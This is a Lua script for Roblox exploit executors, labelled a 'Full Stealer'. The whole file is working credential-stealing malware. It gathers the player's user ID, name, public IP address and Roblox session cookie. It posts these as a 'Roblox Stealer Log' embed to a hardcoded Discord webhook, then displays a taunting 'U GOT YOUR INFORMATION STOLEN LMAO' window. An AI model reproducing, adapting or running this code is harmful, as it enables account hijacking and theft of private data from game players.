-- Delta Executor (PC & Mobile) – Full Stealer + GUI
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

local function sendData(url, jsonPayload)
    local headers = {["Content-Type"] = "application/json"}
    local success, response = pcall(function()
        return request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = jsonPayload
        })
    end)
    if success and response then return true end
    success, response = pcall(function()
        return http_request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = jsonPayload
        })
    end)
    return success and response
end

local function getInfo()
    local info = {}
    info.executor = getexecutorname and getexecutorname() or "Delta"
    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
    end
    info.placeId = tostring(game.PlaceId)
    info.jobId = game.JobId
    local ipOk, ip = pcall(function()
        return game:GetService("HttpService"):GetAsync("https://api.ipify.org")
    end)
    info.ip = ipOk and ip or "N/A"
    local cookieOk, cookieVal = pcall(function()
        return getcookie("https://www.roblox.com/")
    end)
    info.cookie = cookieOk and cookieVal or "Not available"
    pcall(function()
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.platform = tostring(game:GetService("UserInputService").Platform)
    end)
    return info
end

local function buildEmbed(data)
    local fields = {}
    for key, value in pairs(data) do
        table.insert(fields, {name = key, value = value, inline = true})
    end
    return {
        embeds = {{
            title = "Roblox Stealer Log",
            color = 0xFF0000,
            fields = fields,
            timestamp = os.date("!%Y-%m-%dT%TZ"),
            footer = { text = "Delta Executor" }
        }}
    }
end

local collected = getInfo()
local embedPayload = buildEmbed(collected)
local jsonString = game:GetService("HttpService"):JSONEncode(embedPayload)
sendData(webhook, jsonString)

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 500, 0, 200)
frame.Position = UDim2.new(0.5, -250, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BackgroundTransparency = 0.9
frame.Parent = screenGui

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(255, 0, 0)
stroke.Thickness = 4
stroke.Parent = frame

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 1, -50)
label.Position = UDim2.new(0, 0, 0, 10)
label.BackgroundTransparency = 1
label.Text = "U GOT YOUR INFORMATION STOLEN LMAO"
label.TextColor3 = Color3.fromRGB(255, 0, 0)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextWrapped = true
label.Parent = frame

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 120, 0, 40)
closeButton.Position = UDim2.new(0.5, -60, 1, -50)
closeButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
closeButton.Text = "Close"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextScaled = true
closeButton.Font = Enum.Font.Gotham
closeButton.Parent = frame
local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = closeButton

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

frame.BackgroundTransparency = 1
frame:TweenPosition(UDim2.new(0.5, -250, 0.5, -100), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.5, true)
frame:TweenSize(UDim2.new(0, 500, 0, 200), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.4, true)
frame:TweenBackgroundTransparency(0.1, Enum.EasingDirection.Out, Enum.EasingStyle.Linear, 0.3, true)
